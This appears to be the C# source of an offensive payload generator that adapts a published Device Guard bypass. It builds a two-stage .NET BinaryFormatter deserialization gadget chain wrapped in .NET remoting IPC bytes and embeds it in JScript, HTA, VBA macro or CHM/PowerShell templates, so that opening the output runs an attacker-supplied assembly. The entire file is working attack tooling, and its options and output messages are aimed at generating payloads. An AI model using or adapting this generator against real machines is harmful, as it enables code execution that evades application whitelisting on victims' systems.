//Technique adapted from James Forsaw https://www.tiraniddo.dev/2017/07/dg-on-windows-10-s-executing-arbitrary.html

using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;

namespace Aladdin
{
    static class StringExtensions
    {
        public static IEnumerable<String> SplitInParts(this String s, Int32 partLength)
        {
            if (s == null)
                throw new ArgumentNullException(nameof(s));
            if (partLength <= 0)
                throw new ArgumentException("Part length has to be positive.", nameof(partLength));

            for (var i = 0; i < s.Length; i += partLength)
                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
        }
    }

    class Program
    {

        static readonly Dictionary<int, int> d = new Dictionary<int, int>()
        {
        {0x0 , 0x0 },
        {0x1 , 0x1 },
        {0x2 , 0x2 },
        {0x3 , 0x3 },
        {0x4 , 0x4 },
        {0x5 , 0x5 },
        {0x6 , 0x6 },
        {0x7 , 0x7 },
        {0x8 , 0x8 },
        {0x9 , 0x9 },
        {0xa , 0xa },
        {0xb , 0xb },
        {0xc , 0xc },
        {0xd , 0xd },
        {0xe , 0xe },
        {0xf , 0xf },
        {0x10 , 0x10 },
        {0x11 , 0x11 },
        {0x12 , 0x12 },
        {0x13 , 0x13 },
        {0x14 , 0x14 },
        {0x15 , 0x15 },
        {0x16 , 0x16 },
        {0x17 , 0x17 },
        {0x18 , 0x18 },
        {0x19 , 0x19 },
        {0x1a , 0x1a },
        {0x1b , 0x1b },
        {0x1c , 0x1c },
        {0x1d , 0x1d },
        {0x1e , 0x1e },
        {0x1f , 0x1f },
        {0x20 , 0x20 },
        {0x21 , 0x21 },
        {0x22 , 0x22 },
        {0x23 , 0x23 },
        {0x24 , 0x24 },
        {0x25 , 0x25 },
        {0x26 , 0x26 },
        {0x27 , 0x27 },
        {0x28 , 0x28 },
        {0x29 , 0x29 },
        {0x2a , 0x2a },
        {0x2b , 0x2b },
        {0x2c , 0x2c },
        {0x2d , 0x2d },
        {0x2e , 0x2e },
        {0x2f , 0x2f },
        {0x30 , 0x30 },
        {0x31 , 0x31 },
        {0x32 , 0x32 },
        {0x33 , 0x33 },
        {0x34 , 0x34 },
        {0x35 , 0x35 },
        {0x36 , 0x36 },
        {0x37 , 0x37 },
        {0x38 , 0x38 },
        {0x39 , 0x39 },
        {0x3a , 0x3a },
        {0x3b , 0x3b },
        {0x3c , 0x3c },
        {0x3d , 0x3d },
        {0x3e , 0x3e },
        {0x3f , 0x3f },
        {0x40 , 0x40 },
        {0x41 , 0x41 },
        {0x42 , 0x42 },
        {0x43 , 0x43 },
        {0x44 , 0x44 },
        {0x45 , 0x45 },
        {0x46 , 0x46 },
        {0x47 , 0x47 },
        {0x48 , 0x48 },
        {0x49 , 0x49 },
        {0x4a , 0x4a },
        {0x4b , 0x4b },
        {0x4c , 0x4c },
        {0x4d , 0x4d },
        {0x4e , 0x4e },
        {0x4f , 0x4f },
        {0x50 , 0x50 },
        {0x51 , 0x51 },
        {0x52 , 0x52 },
        {0x53 , 0x53 },
        {0x54 , 0x54 },
        {0x55 , 0x55 },
        {0x56 , 0x56 },
        {0x57 , 0x57 },
        {0x58 , 0x58 },
        {0x59 , 0x59 },
        {0x5a , 0x5a },
        {0x5b , 0x5b },
        {0x5c , 0x5c },
        {0x5d , 0x5d },
        {0x5e , 0x5e },
        {0x5f , 0x5f },
        {0x60 , 0x60 },
        {0x61 , 0x61 },
        {0x62 , 0x62 },
        {0x63 , 0x63 },
        {0x64 , 0x64 },
        {0x65 , 0x65 },
        {0x66 , 0x66 },
        {0x67 , 0x67 },
        {0x68 , 0x68 },
        {0x69 , 0x69 },
        {0x6a , 0x6a },
        {0x6b , 0x6b },
        {0x6c , 0x6c },
        {0x6d , 0x6d },
        {0x6e , 0x6e },
        {0x6f , 0x6f },
        {0x70 , 0x70 },
        {0x71 , 0x71 },
        {0x72 , 0x72 },
        {0x73 , 0x73 },
        {0x74 , 0x74 },
        {0x75 , 0x75 },
        {0x76 , 0x76 },
        {0x77 , 0x77 },
        {0x78 , 0x78 },
        {0x79 , 0x79 },
        {0x7a , 0x7a },
        {0x7b , 0x7b },
        {0x7c , 0x7c },
        {0x7d , 0x7d },
        {0x7e , 0x7e },
        {0x7f , 0x7f },
        {0x80 , 0x20ac },
        {0x81 , 0x81 },
        {0x82 , 0x201a },
        {0x83 , 0x192 },
        {0x84 , 0x201e },
        {0x85 , 0x2026 },
        {0x86 , 0x2020 },
        {0x87 , 0x2021 },
        {0x88 , 0x2c6 },
        {0x89 , 0x2030 },
        {0x8a , 0x160 },
        {0x8b , 0x2039 },
        {0x8c , 0x152 },
        {0x8d , 0x8d },
        {0x8e , 0x17d },
        {0x8f , 0x8f },
        {0x90 , 0x90 },
        {0x91 , 0x2018 },
        {0x92 , 0x2019 },
        {0x93 , 0x201c },
        {0x94 , 0x201d },
        {0x95 , 0x2022 },
        {0x96 , 0x2013 },
        {0x97 , 0x2014 },
        {0x98 , 0x2dc },
        {0x99 , 0x2122 },
        {0x9a , 0x161 },
        {0x9b , 0x203a },
        {0x9c , 0x153 },
        {0x9d , 0x9d },
        {0x9e , 0x17e },
        {0x9f , 0x178 },
        {0xa0 , 0xa0 },
        {0xa1 , 0xa1 },
        {0xa2 , 0xa2 },
        {0xa3 , 0xa3 },
        {0xa4 , 0xa4 },
        {0xa5 , 0xa5 },
        {0xa6 , 0xa6 },
        {0xa7 , 0xa7 },
        {0xa8 , 0xa8 },
        {0xa9 , 0xa9 },
        {0xaa , 0xaa },
        {0xab , 0xab },
        {0xac , 0xac },
        {0xad , 0xad },
        {0xae , 0xae },
        {0xaf , 0xaf },
        {0xb0 , 0xb0 },
        {0xb1 , 0xb1 },
        {0xb2 , 0xb2 },
        {0xb3 , 0xb3 },
        {0xb4 , 0xb4 },
        {0xb5 , 0xb5 },
        {0xb6 , 0xb6 },
        {0xb7 , 0xb7 },
        {0xb8 , 0xb8 },
        {0xb9 , 0xb9 },
        {0xba , 0xba },
        {0xbb , 0xbb },
        {0xbc , 0xbc },
        {0xbd , 0xbd },
        {0xbe , 0xbe },
        {0xbf , 0xbf },
        {0xc0 , 0xc0 },
        {0xc1 , 0xc1 },
        {0xc2 , 0xc2 },
        {0xc3 , 0xc3 },
        {0xc4 , 0xc4 },
        {0xc5 , 0xc5 },
        {0xc6 , 0xc6 },
        {0xc7 , 0xc7 },
        {0xc8 , 0xc8 },
        {0xc9 , 0xc9 },
        {0xca , 0xca },
        {0xcb , 0xcb },
        {0xcc , 0xcc },
        {0xcd , 0xcd },
        {0xce , 0xce },
        {0xcf , 0xcf },
        {0xd0 , 0xd0 },
        {0xd1 , 0xd1 },
        {0xd2 , 0xd2 },
        {0xd3 , 0xd3 },
        {0xd4 , 0xd4 },
        {0xd5 , 0xd5 },
        {0xd6 , 0xd6 },
        {0xd7 , 0xd7 },
        {0xd8 , 0xd8 },
        {0xd9 , 0xd9 },
        {0xda , 0xda },
        {0xdb , 0xdb },
        {0xdc , 0xdc },
        {0xdd , 0xdd },
        {0xde , 0xde },
        {0xdf , 0xdf },
        {0xe0 , 0xe0 },
        {0xe1 , 0xe1 },
        {0xe2 , 0xe2 },
        {0xe3 , 0xe3 },
        {0xe4 , 0xe4 },
        {0xe5 , 0xe5 },
        {0xe6 , 0xe6 },
        {0xe7 , 0xe7 },
        {0xe8 , 0xe8 },
        {0xe9 , 0xe9 },
        {0xea , 0xea },
        {0xeb , 0xeb },
        {0xec , 0xec },
        {0xed , 0xed },
        {0xee , 0xee },
        {0xef , 0xef },
        {0xf0 , 0xf0 },
        {0xf1 , 0xf1 },
        {0xf2 , 0xf2 },
        {0xf3 , 0xf3 },
        {0xf4 , 0xf4 },
        {0xf5 , 0xf5 },
        {0xf6 , 0xf6 },
        {0xf7 , 0xf7 },
        {0xf8 , 0xf8 },
        {0xf9 , 0xf9 },
        {0xfa , 0xfa },
        {0xfb , 0xfb },
        {0xfc , 0xfc },
        {0xfd , 0xfd },
        {0xfe , 0xfe },
        {0xff , 0xff}

        };
        public static void Help(OptionSet opt)
        {
            Console.WriteLine("[*] Help:\n");
            opt.WriteOptionDescriptions(Console.Out);
            Environment.Exit(0);
        }
        static void Main(string[] args)
        {
            string resourceName = "";
            string template = "";
            string output = "final";
            string assembly = "";
            bool showhelp = false;

            OptionSet options = new OptionSet(){
                {"w|scriptType=","Set to js / hta / vba / chm.\n", v =>template=v},
                {"o|output=","The generated output, e.g: -o C:\\Users\\Nettitude\\Desktop\\payload \n", v =>output=v},
                {"a|assembly=","Provided Assembly DLL, e.g: -a C:\\Users\\Nettitude\\Desktop\\popcalc.dll \n", v => assembly=v},
                {"h|help","Help", v => {showhelp=true; }}
            };
            try
            {
                options.Parse(args);
                if(showhelp)
                    Help(options);
                switch (template.ToLower())
                {
                    case "js":
                        resourceName = Properties.Resources.jscript_template.ToLower();
                        break;
                    case "hta":
                        resourceName = Properties.Resources.htascript_template.ToLower();
                        break;
                    case "vba":
                        resourceName = Properties.Resources.vba_template.ToLower();
                        break;
                    case "chm":
                        resourceName = Properties.Resources.chmps1_template.ToLower();
                        break;
                    default:
                        Help(options);
                        break;
                }
                if (!File.Exists(assembly))
                {
                    Console.WriteLine("[!] Provided assembly was not found.");
                    Help(options);
                    return;
                }

            }
            catch (OptionException e)
            {
                Console.WriteLine("[!] Invalid arguments!");
                Console.WriteLine(e.Message);
                Help(options);
                return;
            }

            Console.WriteLine("[*] Generating a " + template.ToUpper() + " payload");
            const string IPC_URI = "ipc://32a91b0f-30cd-4c75-be79-ccbd6345de99/AddInServer";

            byte[] ba1 = { };
            byte[] ba2 = { };

            var Stage1_ms = new MemoryStream();
            var disable_gadget = new ActivitySurrogateDisableTypeCheckGenerator();
            Stage1_ms = disable_gadget.Generate(Stage1_ms);

            ba1 = BuildRequestBytes(Stage1_ms.ToArray(), IPC_URI);
            Console.WriteLine("[*] DisableActivitySurrogateSelectorTypeCheck gadget generated.");

            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");

            Console.WriteLine($"[+] Loading provided assembly {assembly}");
            Assembly user_assembly;
            try
            {
                user_assembly = Assembly.LoadFrom(assembly);
                if (user_assembly == null)
                {
                    return;
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error loading provided assembly file. Error Message {ex.Message}:{ex.StackTrace}");
                return;
            }


            BinaryFormatter Stage2_Formatter = new BinaryFormatter();

            MemoryStream Stage2_ms = new MemoryStream();

            PayloadClass Stage2_gadget = new PayloadClass(user_assembly);

            Stage2_Formatter.Serialize(Stage2_ms, Stage2_gadget);


            ba2 = BuildRequestBytes(Stage2_ms.ToArray(), IPC_URI);

            Console.WriteLine("[+] Second stage gadget generation done.");

            Assembly executing_assembly = Assembly.GetExecutingAssembly();

            byte[] final = new byte[ba1.Length + ba2.Length];
            Array.Copy(ba1, final, ba1.Length);
            Array.Copy(ba2, 0, final, ba1.Length, ba2.Length);
            var mapped = final.Select(x => d[x]).ToArray();
            byte[] result = new byte[mapped.Length * sizeof(int)];
            Buffer.BlockCopy(mapped, 0, result, 0, result.Length);

            switch (template.ToLower())
            {
                case "vba":
                    var array = String.Join(",", mapped.Select(b => String.Format("0x{0:X}", b)));
                    var parts = array.SplitInParts(150);
                    var numofsplits = (int)Math.Ceiling((double)parts.Count() / 1000);
                    List<string> payload = new List<string>
                    {
                        "XSLT = XSLT + \"var rawData = ["
                    };
                    for (var i = 0; i < numofsplits; i++)
                    {
                        var current = parts.Skip(i * 1000).Take(1000);

                        if (i == 0)
                        {
                            payload.Add($"XSLT = XSLT + \"" + String.Join($"\"\nXSLT = XSLT + \"", current) + "\"");
                            payload.Add($"part{i + 1}");
                            payload.Add("End Sub");
                        }
                        else if (i == numofsplits - 1)
                        {
                            payload.Add($"Sub part{i}()");
                            payload.Add($"XSLT = XSLT + \"" + String.Join($"\"\nXSLT = XSLT + \"", current) + "];\" & vbNewLine ");
                            payload.Add($"part{i + 1}");
                            payload.Add("End Sub");
                            payload.Add("\n");
                            payload.Add($"Sub part{i + 1}()");
                        }
                        else
                        {
                            payload.Add($"Sub part{i}()");
                            payload.Add($"XSLT = XSLT + \"" + String.Join($"\"\nXSLT = XSLT + \"", current) + "\"");
                            payload.Add($"part{i + 1}");
                            payload.Add("End Sub");
                        }

                    }
                    File.WriteAllText(output + ".vba", Properties.Resources.vba_template.Replace("%BYTES%", String.Join("\n", payload)));
                    break;
                case "chm":
                    array = String.Join(",", mapped.Select(b => String.Format("0x{0:X}", b)));
                    parts = array.SplitInParts(150);
                    numofsplits = (int)Math.Ceiling((double)parts.Count() / 1000);
                    payload = new List<string>
                    {
                        "XSLT = XSLT + 'var rawData = ['"
                    };
                    for (var i = 0; i < numofsplits; i++)
                    {
                        var current = parts.Skip(i * 1000).Take(1000);
                        payload.Add($"XSLT = XSLT + \'" + String.Join($"\'\nXSLT = XSLT + \'", current) + "\'");
                    }
                    File.WriteAllText(output + ".ps1", Properties.Resources.chmps1_template.Replace("%BYTES%", String.Join("\n", payload)));
                    Console.WriteLine("[*] Make sure to modify the PS1 file to include your content. Once the PS1 is executed, it will then generate the final CHM payload");
                    break;
                case "hta":
                    File.WriteAllText(output + ".hta", Properties.Resources.htascript_template.Replace("%BYTES%",
                                    String.Join("," + Environment.NewLine, mapped.Select(b => String.Format("0x{0:X}", b)))));
                    break;
                default:
                    File.WriteAllText(output + ".js", Properties.Resources.jscript_template.Replace("%BYTES%",
                                    String.Join("," + Environment.NewLine, mapped.Select(b => String.Format("0x{0:X}", b)))));
                    break;
            }

            Console.WriteLine("[*] Payload generation completed");
        }

        //code from https://github.com/tyranid/DeviceGuardBypasses/blob/master/CreateAddInIpcData/Program.cs#L26
        static byte[] BuildRequestBytes(byte[] data, string uri)
        {
            MemoryStream stm = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stm);
            writer.Write((uint)0x54454E2E); // Header            
            writer.Write((byte)1); // Major
            writer.Write((byte)0); // Minor
            writer.Write((ushort)0); // OperationType
            writer.Write((ushort)0); // ContentDistribution
            writer.Write(data.Length); // Data Length

            writer.Write((ushort)4); // UriHeader
            writer.Write((byte)1); // DataType
            writer.Write((byte)1); // Encoding: UTF8

            byte[] uriData = Encoding.UTF8.GetBytes(uri);

            writer.Write(uriData.Length); // Length
            writer.Write(uriData); // URI

            writer.Write((ushort)0); // Terminating Header
            writer.Write(data); // Data
            return stm.ToArray();
        }
    }
}
